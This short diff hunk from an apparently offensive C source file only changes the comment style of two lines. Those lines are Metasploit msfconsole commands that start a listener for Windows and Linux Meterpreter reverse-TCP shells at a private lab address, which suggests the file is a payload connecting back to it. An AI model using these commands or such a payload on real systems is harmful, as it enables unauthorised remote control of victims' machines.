@@ -1,5 +1,5 @@
-# msfconsole -qx 'use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.19.128; set EXITFUNC thread; run'
-# msfconsole -qx 'use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.19.128; run'
+// msfconsole -qx 'use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.19.128; set EXITFUNC thread; run'
+// msfconsole -qx 'use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.19.128; run'
 
 #include <stdio.h>
 #include <stdlib.h>
